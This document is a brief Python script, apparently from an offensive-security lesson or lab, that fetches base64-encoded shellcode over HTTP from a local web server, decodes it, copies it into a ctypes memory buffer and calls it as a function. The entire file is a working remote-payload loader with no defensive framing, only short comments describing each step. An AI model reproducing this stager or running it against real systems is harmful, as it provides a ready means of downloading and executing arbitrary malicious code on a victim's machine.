import base64
import ctypes
import urllib.request

# retrieve the shellcode from our web server
url = "http://localhost:8000/shellcode.bin"
response = urllib.request.urlopen(url)

# decode the shellcode from base64 
shellcode = base64.b64decode(response.read())

# create a buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# create a function pointer to our shellcode
shellcode_func = ctypes.cast(shellcode_buffer,
                             ctypes.CFUNCTYPE(ctypes.c_void_p))

# call our shellcode
shellcode_func()
